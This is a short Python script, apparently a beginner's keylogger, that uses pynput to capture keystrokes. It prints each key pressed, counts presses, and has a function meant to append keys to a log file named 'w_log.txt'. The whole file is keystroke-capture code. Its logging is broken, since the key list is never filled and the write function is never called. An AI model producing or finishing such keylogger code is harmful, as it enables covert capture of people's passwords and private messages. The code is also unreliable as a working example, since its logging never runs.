import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global count, keys
    print(" {0} key pressed".format(key))
    count+=1


def write_file(keys):
    with open("w_log.txt", "a") as i:
        for key in keys:
            i.write(key)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
